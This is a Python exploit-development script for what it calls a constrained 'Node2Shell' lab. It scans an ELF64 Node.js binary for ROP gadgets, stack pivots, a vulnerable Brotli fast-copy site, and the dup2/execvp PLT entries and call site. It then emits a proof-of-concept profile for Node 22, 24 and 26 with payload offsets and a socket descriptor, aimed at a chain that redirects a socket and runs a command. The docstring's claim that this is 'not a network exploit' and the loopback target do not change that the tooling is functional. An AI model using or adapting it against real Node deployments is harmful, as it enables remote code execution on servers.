#!/usr/bin/env python3
"""Extract the constrained Node2Shell lab's ROP facts from an ELF64 Node binary.

The output is an analysis record, not a network exploit.  It accepts only a
local ELF file and locates the small instruction sequences used by the bundled
loopback-only, fixed-command verification harness.
"""

from __future__ import annotations

import argparse
import hashlib
import json
from pathlib import Path
import re
import struct
import subprocess
import sys


ELF_HEADER = struct.Struct("<16sHHIQQQIHHHHHH")
PROGRAM_HEADER = struct.Struct("<IIQQQQQQ")
SECTION_HEADER = struct.Struct("<IIQQQQIIQQ")
PT_LOAD = 1
PF_X = 1


class ElfError(RuntimeError):
    pass


class Elf64:
    def __init__(self, path: Path) -> None:
        self.path = path
        self.data = path.read_bytes()
        if len(self.data) < ELF_HEADER.size:
            raise ElfError("file is smaller than an ELF64 header")
        header = ELF_HEADER.unpack_from(self.data)
        ident = header[0]
        if ident[:4] != b"\x7fELF" or ident[4:6] != b"\x02\x01":
            raise ElfError("expected a little-endian ELF64 binary")
        self.e_type = header[1]
        self.phoff = header[5]
        self.shoff = header[6]
        self.phentsize = header[9]
        self.phnum = header[10]
        self.shentsize = header[11]
        self.shnum = header[12]
        self.shstrndx = header[13]
        if self.phentsize != PROGRAM_HEADER.size:
            raise ElfError("unexpected ELF program-header size")
        if self.shentsize != SECTION_HEADER.size:
            raise ElfError("unexpected ELF section-header size")

        self.segments = [
            PROGRAM_HEADER.unpack_from(self.data, self.phoff + i * self.phentsize)
            for i in range(self.phnum)
        ]
        self.sections = [
            SECTION_HEADER.unpack_from(self.data, self.shoff + i * self.shentsize)
            for i in range(self.shnum)
        ]
        strings = self.sections[self.shstrndx]
        self.section_names = self.data[strings[4] : strings[4] + strings[5]]

    def _section_name(self, index: int) -> str:
        offset = self.sections[index][0]
        end = self.section_names.find(b"\0", offset)
        if end < 0:
            raise ElfError("unterminated section name")
        return self.section_names[offset:end].decode("ascii", errors="strict")

    def section(self, name: str) -> tuple[int, ...]:
        for index, section in enumerate(self.sections):
            if self._section_name(index) == name:
                return section
        raise ElfError(f"missing required section: {name}")

    def executable_segments(self) -> list[tuple[int, bytes]]:
        result: list[tuple[int, bytes]] = []
        for segment in self.segments:
            kind, flags, offset, vaddr, _paddr, filesz, _memsz, _align = segment
            if kind == PT_LOAD and flags & PF_X:
                result.append((vaddr, self.data[offset : offset + filesz]))
        if not result:
            raise ElfError("ELF has no executable PT_LOAD segment")
        return result

    def find_bytes(self, needle: bytes) -> list[int]:
        matches: list[int] = []
        for vaddr, segment in self.executable_segments():
            start = 0
            while True:
                offset = segment.find(needle, start)
                if offset < 0:
                    break
                matches.append(vaddr + offset)
                start = offset + 1
        return matches

    def find_pattern(self, pattern: bytes) -> list[tuple[int, bytes]]:
        matches: list[tuple[int, bytes]] = []
        compiled = re.compile(pattern, re.DOTALL)
        for vaddr, segment in self.executable_segments():
            for match in compiled.finditer(segment):
                matches.append((vaddr + match.start(), match.group(1)))
        return matches

    def find_short_sequences(
        self, prefix: bytes, displacement_offset: int, displacement_size: int, tail_limit: int = 16
    ) -> list[tuple[int, int, bytes]]:
        result: list[tuple[int, int, bytes]] = []
        encoding = "<b" if displacement_size == 1 else "<i"
        for vaddr, segment in self.executable_segments():
            start = 0
            while True:
                offset = segment.find(prefix, start)
                if offset < 0:
                    break
                displacement_start = offset + displacement_offset
                raw = segment[displacement_start : displacement_start + displacement_size]
                if len(raw) == displacement_size:
                    displacement = struct.unpack(encoding, raw)[0]
                    instruction_end = displacement_start + displacement_size
                    ret = segment.find(b"\xc3", instruction_end, instruction_end + tail_limit + 1)
                    if ret >= 0:
                        result.append((vaddr + offset, displacement, segment[offset : ret + 1]))
                start = offset + 1
        return result

    def read_virtual(self, address: int, length: int) -> bytes:
        for segment in self.segments:
            kind, _flags, offset, vaddr, _paddr, filesz, _memsz, _align = segment
            if kind == PT_LOAD and vaddr <= address <= vaddr + filesz - length:
                file_offset = offset + address - vaddr
                return self.data[file_offset : file_offset + length]
        raise ElfError(f"virtual address is not file-backed: {address:#x}")


def one(values: list[int], label: str) -> int:
    if len(values) != 1:
        rendered = ", ".join(f"{value:#x}" for value in values[:12])
        raise ElfError(f"expected one {label}, found {len(values)}: {rendered}")
    return values[0]


def plt_symbols(path: Path) -> dict[str, int]:
    completed = subprocess.run(
        ["objdump", "-d", "-j", ".plt", str(path)],
        check=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )
    symbols: dict[str, int] = {}
    for address, name in re.findall(r"^([0-9a-f]+) <([^>]+)@plt>:$", completed.stdout, re.M):
        symbols[name] = int(address, 16)
    return symbols


def execvp_call_sites(elf: Elf64, execvp_plt: int) -> list[tuple[int, str]]:
    patterns = {
        # mov rsi,[base+0x10]; mov rdi,[base+0x8]; call rel32
        "rbx": bytes.fromhex("488b7310488b7b08e8"),
        "r14": bytes.fromhex("498b7610498b7e08e8"),
        # Newer libuv emits the two argument loads in the opposite order.
        "r14-reversed": bytes.fromhex("498b7e08498b7610e8"),
    }
    result: list[tuple[int, str]] = []
    for base, prefix in patterns.items():
        for site in elf.find_bytes(prefix):
            displacement = struct.unpack("<i", elf.read_virtual(site + 9, 4))[0]
            if site + 13 + displacement == execvp_plt:
                result.append((site, base.removesuffix("-reversed")))
    return result


def text_symbol_address(path: Path, name: str) -> int | None:
    completed = subprocess.run(
        ["nm", "-n", "--defined-only", str(path)],
        check=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
        text=True,
    )
    suffix = " " + name
    for line in completed.stdout.splitlines():
        if line.endswith(suffix):
            return int(line.split(None, 1)[0], 16)
    return None


def extract(path: Path) -> dict[str, object]:
    elf = Elf64(path)
    elf_types = {2: "ET_EXEC", 3: "ET_DYN"}
    if elf.e_type not in elf_types:
        raise ElfError(
            "the constrained lab requires an ELF64 ET_EXEC or ET_DYN Node binary"
        )

    patterns = {
        "mov_rax_rdi_ret": bytes.fromhex("4889f8c3"),
        "mov_rax_rsi_ret": bytes.fromhex("4889f0c3"),
        "mov_rdi_rax_ret": bytes.fromhex("4889c7c3"),
        "pivot_rsp_rax_30_ret": bytes.fromhex("488d6030f3c3"),
        "pop_rax_ret": bytes.fromhex("58c3"),
        "pop_rsp_ret": bytes.fromhex("5cc3"),
        "leave_ret": bytes.fromhex("c9c3"),
        "pop_rsi_ret": bytes.fromhex("5ec3"),
        "store_rdi_plus_88_ret": bytes.fromhex("4881c78800000031c048893ec3"),
        "lea_rdi_rax_plus_88_ret": bytes.fromhex("488db888000000c3"),
        "store_rdi_at_rsi_ret": bytes.fromhex("48893ec3"),
        "store_rdi_at_rsi_xor_eax_ret": bytes.fromhex("48893e31c0c3"),
        "store_rax_at_rsi_ret": bytes.fromhex("488906c3"),
        "store_rax_at_rsi_xor_eax_ret": bytes.fromhex("48890631c0c3"),
        "pop_rbx_ret": bytes.fromhex("5bc3"),
        "pop_r14_ret": bytes.fromhex("415ec3"),
        "pop_r14_pop_r15_ret": bytes.fromhex("415e415fc3"),
        "pop_rdi_ret": bytes.fromhex("5fc3"),
        "pop_rdi_pop_rsi_ret": bytes.fromhex("5f5ec3"),
    }
    candidates = {name: elf.find_bytes(value) for name, value in patterns.items()}

    # The short pop sequences legitimately occur many times.  Deterministically
    # select the lowest address while retaining the complete candidate set in
    # the analysis output for review.
    required = {
        "leave_ret",
        "pop_rax_ret",
        "pop_rsp_ret",
        "pop_rsi_ret",
        "pop_rdi_ret",
    }
    missing = [name for name in sorted(required) if not candidates[name]]
    if missing:
        raise ElfError(f"missing required gadget patterns: {', '.join(missing)}")
    selected = {name: min(values) for name, values in candidates.items() if values}

    path_pointer_candidates: list[dict[str, object]] = []
    encodings = (
        ("rax", rb"\x48\x8d\xb8(.{4})\xc3", "<i"),
        ("rdi", rb"\x48\x8d\xbf(.{4})\xc3", "<i"),
        ("rax", rb"\x48\x8d\x78(.)\xc3", "<b"),
        ("rdi", rb"\x48\x8d\x7f(.)\xc3", "<b"),
        ("rdi-add", rb"\x48\x81\xc7(.{4})\xc3", "<i"),
    )
    for source, pattern, encoding in encodings:
        for address, raw_displacement in elf.find_pattern(pattern):
            displacement = struct.unpack(encoding, raw_displacement)[0]
            if 0x80 <= displacement <= 0x200:
                path_pointer_candidates.append(
                    {"address": address, "source": source, "offset": displacement}
                )

    pivot_candidates: list[dict[str, object]] = []
    for base, suffix, pattern, encoding in (
        ("rax", "repz-ret", rb"\x48\x8d\xa0(.{4})\xf3\xc3", "<i"),
        ("rax", "ret", rb"\x48\x8d\xa0(.{4})\xc3", "<i"),
        ("rdi", "repz-ret", rb"\x48\x8d\xa7(.{4})\xf3\xc3", "<i"),
        ("rdi", "ret", rb"\x48\x8d\xa7(.{4})\xc3", "<i"),
        ("rsi", "repz-ret", rb"\x48\x8d\xa6(.{4})\xf3\xc3", "<i"),
        ("rsi", "ret", rb"\x48\x8d\xa6(.{4})\xc3", "<i"),
        ("rax", "repz-ret", rb"\x48\x8d\x60(.)\xf3\xc3", "<b"),
        ("rax", "ret", rb"\x48\x8d\x60(.)\xc3", "<b"),
        ("rdi", "repz-ret", rb"\x48\x8d\x67(.)\xf3\xc3", "<b"),
        ("rdi", "ret", rb"\x48\x8d\x67(.)\xc3", "<b"),
        ("rsi", "repz-ret", rb"\x48\x8d\x66(.)\xf3\xc3", "<b"),
        ("rsi", "ret", rb"\x48\x8d\x66(.)\xc3", "<b"),
    ):
        for address, raw_displacement in elf.find_pattern(pattern):
            displacement = struct.unpack(encoding, raw_displacement)[0]
            if -0x2000 <= displacement <= 0x2000:
                pivot_candidates.append(
                    {
                        "address": address,
                        "base": base,
                        "offset": displacement,
                        "suffix": suffix,
                    }
                )

    rdi_adjust_candidates: list[dict[str, object]] = []
    for operation, pattern, sign in (
        ("add", rb"\x48\x81\xc7(.{4})\xc3", 1),
        ("add-xor-eax", rb"\x48\x81\xc7(.{4})\x31\xc0\xc3", 1),
        ("sub", rb"\x48\x81\xef(.{4})\xc3", -1),
        ("lea", rb"\x48\x8d\xbf(.{4})\xc3", 1),
    ):
        for address, raw_displacement in elf.find_pattern(pattern):
            immediate = struct.unpack("<i", raw_displacement)[0]
            displacement = immediate * sign
            if -0x2000 <= displacement <= 0x2000:
                rdi_adjust_candidates.append(
                    {
                        "address": address,
                        "displacement": displacement,
                        "operation": operation,
                    }
                )

    rax_from_rdi_candidates: list[dict[str, object]] = []
    for pattern, encoding in (
        (rb"\x48\x8d\x87(.{4})\xc3", "<i"),
        (rb"\x48\x8d\x47(.)\xc3", "<b"),
    ):
        for address, raw_displacement in elf.find_pattern(pattern):
            displacement = struct.unpack(encoding, raw_displacement)[0]
            if -0x2000 <= displacement <= 0x2000:
                rax_from_rdi_candidates.append(
                    {"address": address, "displacement": displacement}
                )

    load_rax_rsp_candidates: list[dict[str, object]] = []
    for pattern, encoding in (
        (rb"\x48\x8b\x84\x24(.{4})\xc3", "<i"),
        (rb"\x48\x8b\x44\x24(.)\xc3", "<b"),
    ):
        for address, raw_displacement in elf.find_pattern(pattern):
            displacement = struct.unpack(encoding, raw_displacement)[0]
            if -0x1000 <= displacement <= 0x1000:
                load_rax_rsp_candidates.append(
                    {"address": address, "displacement": displacement}
                )

    short_path_candidates: list[dict[str, object]] = []
    short_encodings = (
        ("rax", bytes.fromhex("488db8"), 3, 4),
        ("rdi", bytes.fromhex("488dbf"), 3, 4),
        ("rax", bytes.fromhex("488d78"), 3, 1),
        ("rdi", bytes.fromhex("488d7f"), 3, 1),
        ("rdi-add", bytes.fromhex("4881c7"), 3, 4),
        ("rax-add", bytes.fromhex("4805"), 2, 4),
    )
    for source, prefix, displacement_offset, displacement_size in short_encodings:
        for address, displacement, sequence in elf.find_short_sequences(
            prefix, displacement_offset, displacement_size
        ):
            if 0x80 <= displacement <= 0x200:
                short_path_candidates.append(
                    {
                        "address": address,
                        "source": source,
                        "offset": displacement,
                        "bytes": sequence.hex(),
                    }
                )

    pure_add_rax_90 = [
        item
        for item in short_path_candidates
        if item["source"] == "rax-add"
        and item["offset"] == 0x90
        and item["bytes"] == "480590000000c3"
    ]
    if not pure_add_rax_90:
        raise ElfError("missing add rax,0x90; ret path-pointer gadget")
    selected["add_rax_90_ret"] = min(int(item["address"]) for item in pure_add_rax_90)

    store_rax_name = next(
        (
            name
            for name in ("store_rax_at_rsi_ret", "store_rax_at_rsi_xor_eax_ret")
            if name in selected
        ),
        None,
    )
    if store_rax_name is None:
        raise ElfError("missing mov [rsi],rax; ...; ret pointer-store gadget")
    selected["store_rax_at_rsi_selected"] = selected[store_rax_name]

    copy_forms = (
        # movdqu xmm0,[r8]; movups [rdi],xmm0
        (bytes.fromhex("f3410f6f000f1107"), 5, "r8", "rdi", "state+0x88"),
        # movdqu xmm0,[rdi]; movups [r8],xmm0
        (bytes.fromhex("f30f6f07410f1100"), 4, "rdi", "r8", "state+0x88"),
        # rsi=[r8+rdx]; movups xmm0,[r8+rdx]; movups [r8+rax],xmm0
        (
            bytes.fromhex(
                "498d34104429a384000000410f100410478d3c2c410f110400"
            ),
            20,
            "rsi",
            "r8+rax",
            "r8",
        ),
        # PIE builds can use r13 for BrotliDecoderState and materialize both
        # source and destination before the 16-byte copy.
        (bytes.fromhex("f30f6f060f1107"), 4, "rsi", "rdi", "r13+0x88"),
    )
    copy_sites: list[tuple[int, str, str, str]] = []
    for pattern, store_offset, source_register, destination_expression, ring_expression in copy_forms:
        for address in elf.find_bytes(pattern):
            copy_sites.append(
                (address + store_offset, source_register, destination_expression, ring_expression)
            )
    if len(copy_sites) > 1:
        process_start = text_symbol_address(path, "ProcessCommands")
        process_end = text_symbol_address(path, "SafeProcessCommands")
        if process_start is not None and process_end is not None:
            copy_sites = [
                item for item in copy_sites if process_start <= item[0] < process_end
            ]
    if len(copy_sites) != 1:
        rendered = ", ".join(
            f"{address:#x}/{register}/{destination}"
            for address, register, destination, _ring in copy_sites
        )
        raise ElfError(f"expected one vulnerable fast-copy site, found {len(copy_sites)}: {rendered}")
    copy_breakpoint, source_register, destination_expression, ring_expression = copy_sites[0]
    source_move = f"mov_rax_{source_register}_ret"

    symbols = plt_symbols(path)
    try:
        dup2_plt = symbols["dup2"]
        execvp_plt = symbols["execvp"]
    except KeyError as error:
        raise ElfError(f"missing required PLT symbol: {error.args[0]}") from error
    call_sites = execvp_call_sites(elf, execvp_plt)
    if len(call_sites) != 1:
        rendered = ", ".join(f"{address:#x}/{base}" for address, base in call_sites)
        raise ElfError(
            f"expected one compatible execvp call site, found {len(call_sites)}: {rendered}"
        )
    call_site, call_base = call_sites[0]
    required_pop = f"pop_{call_base}_ret"
    execvp_base_padding = 0
    if required_pop in selected:
        pop_execvp_base = selected[required_pop]
    elif call_base == "r14" and "pop_r14_pop_r15_ret" in selected:
        pop_execvp_base = selected["pop_r14_pop_r15_ret"]
        execvp_base_padding = 1
    else:
        raise ElfError(f"missing required {call_base} restore gadget")

    bss = elf.section(".bss")
    bss_start, bss_size = bss[3], bss[5]
    if bss_size < 0x100:
        raise ElfError(".bss is too small for the fixed proof-program scratch area")
    bss_base = (bss_start + bss_size - 0x80) & ~0xF

    profile = {
        "node_binary": str(path.resolve()),
        "node_binary_sha256": hashlib.sha256(elf.data).hexdigest(),
        "elf_type": elf_types[elf.e_type],
        **{name: f"0x{address:x}" for name, address in selected.items()},
        "dup2_plt": f"0x{dup2_plt:x}",
        "execvp_plt": f"0x{execvp_plt:x}",
        "execvp_call_site": f"0x{call_site:x}",
        "execvp_call_base": call_base,
        "pop_execvp_base_selected": f"0x{pop_execvp_base:x}",
        "execvp_base_padding": execvp_base_padding,
        "copy_breakpoint": f"0x{copy_breakpoint:x}",
        "copy_source_register": source_register,
        "copy_destination_expression": destination_expression,
        "copy_ring_expression": ring_expression,
        "bss_start": f"0x{bss_start:x}",
        "bss_size": f"0x{bss_size:x}",
        "bss_base": f"0x{bss_base:x}",
        "candidate_counts": {name: len(values) for name, values in candidates.items()},
        "path_pointer_candidates": [
            {
                "address": f"0x{item['address']:x}",
                "source": item["source"],
                "offset": f"0x{item['offset']:x}",
            }
            for item in sorted(path_pointer_candidates, key=lambda item: (item["offset"], item["address"]))
        ],
        "pivot_candidates": [
            {
                "address": f"0x{item['address']:x}",
                "base": item["base"],
                "offset": item["offset"],
                "suffix": item["suffix"],
            }
            for item in sorted(pivot_candidates, key=lambda item: (item["offset"], item["address"]))
        ],
        "rdi_adjust_candidates": [
            {
                "address": f"0x{item['address']:x}",
                "displacement": item["displacement"],
                "operation": item["operation"],
            }
            for item in sorted(
                rdi_adjust_candidates,
                key=lambda item: (item["displacement"], item["address"]),
            )
        ],
        "rax_from_rdi_candidates": [
            {
                "address": f"0x{item['address']:x}",
                "displacement": item["displacement"],
            }
            for item in sorted(
                rax_from_rdi_candidates,
                key=lambda item: (item["displacement"], item["address"]),
            )
        ],
        "load_rax_rsp_candidates": [
            {
                "address": f"0x{item['address']:x}",
                "displacement": item["displacement"],
            }
            for item in sorted(
                load_rax_rsp_candidates,
                key=lambda item: (item["displacement"], item["address"]),
            )
        ],
        "short_path_candidates": [
            {
                "address": f"0x{item['address']:x}",
                "source": item["source"],
                "offset": f"0x{item['offset']:x}",
                "bytes": item["bytes"],
            }
            for item in sorted(short_path_candidates, key=lambda item: (len(item["bytes"]), item["address"]))[:64]
        ],
    }
    if source_move in selected:
        profile["mov_rax_source_ret"] = f"0x{selected[source_move]:x}"
    return profile


def poc_profile(analysis: dict[str, object], version: str) -> dict[str, object]:
    if re.fullmatch(r"\d+\.\d+\.\d+", version) is None:
        raise ValueError("version must have the form major.minor.patch")
    major = int(version.split(".", 1)[0])
    family = {
        22: {
            "copy_source_offset": "0x3e7",
            "bootstrap_prefix_offset": "0x207",
            "rax_base_prefix_offset": "0x1e7",
            "decoder_compat_chain_offset": "0x217",
            "decoder_compat_proof_offset": "0x277",
            "staged_positions": ["0x3d1ef7c8"],
        },
        24: {
            "copy_source_offset": "0x367",
            "bootstrap_prefix_offset": "0x387",
            "rax_base_prefix_offset": "0x367",
            "decoder_compat_chain_offset": "0x397",
            "decoder_compat_proof_offset": "0x3f7",
            "staged_positions": ["0x550e0748"],
        },
        26: {
            "copy_source_offset": "0x217",
            "bootstrap_prefix_offset": "0x237",
            "rax_base_prefix_offset": "0x217",
            "decoder_compat_chain_offset": "0x247",
            "decoder_compat_proof_offset": "0x2a7",
            "staged_positions": ["0x5506c5f8"],
        },
    }.get(major)
    if family is None:
        raise ValueError("only the officially affected 22.x, 24.x, and 26.x lines are supported")
    call_base = str(analysis["execvp_call_base"])
    return {
        "id": f"node-{version}-express-5.3.0-bookworm-x86_64-nonce-proof-v3",
        "version": version,
        "target": "127.0.0.1:3000",
        "node_binary_sha256": analysis["node_binary_sha256"],
        "chain_version": 3,
        "prefix_size": 1031,
        **family,
        "command_block_extra": "0xffffff",
        "second_stage_size": 256,
        "stage_delay_seconds": 0.5,
        "restart_timeout_seconds": 8,
        "write_wrap_compensation": "0x2800",
        "accepted_socket_fd": 22,
        "copy_breakpoint": analysis["copy_breakpoint"],
        "copy_source_register": analysis["copy_source_register"],
        "copy_destination_expression": analysis["copy_destination_expression"],
        "copy_ring_expression": analysis["copy_ring_expression"],
        "ring_base": "0x7fffa0003c10",
        "leave_ret": analysis["leave_ret"],
        "pop_rax_ret": analysis["pop_rax_ret"],
        "pop_rsp_ret": analysis["pop_rsp_ret"],
        "add_rax_path_offset_ret": analysis["add_rax_90_ret"],
        "proof_path_offset": "0x90",
        "pop_rsi_ret": analysis["pop_rsi_ret"],
        "store_rax_at_rsi_ret": analysis["store_rax_at_rsi_selected"],
        "execvp_call_base": call_base,
        "pop_execvp_base_ret": analysis["pop_execvp_base_selected"],
        "execvp_base_padding": analysis["execvp_base_padding"],
        "pop_rdi_ret": analysis["pop_rdi_ret"],
        "dup2_plt": analysis["dup2_plt"],
        "execvp_call_site": analysis["execvp_call_site"],
        "bss_base": analysis["bss_base"],
    }


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("node_binary", type=Path)
    parser.add_argument("--json-output", type=Path)
    parser.add_argument("--poc-version")
    args = parser.parse_args()
    analysis = extract(args.node_binary)
    result = poc_profile(analysis, args.poc_version) if args.poc_version else analysis
    rendered = json.dumps(result, indent=2, sort_keys=True)
    print(rendered)
    if args.json_output:
        args.json_output.write_text(rendered + "\n", encoding="utf-8")
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except (ElfError, OSError, subprocess.CalledProcessError, ValueError) as error:
        print(f"ERROR: {error}", file=sys.stderr)
        raise SystemExit(1)
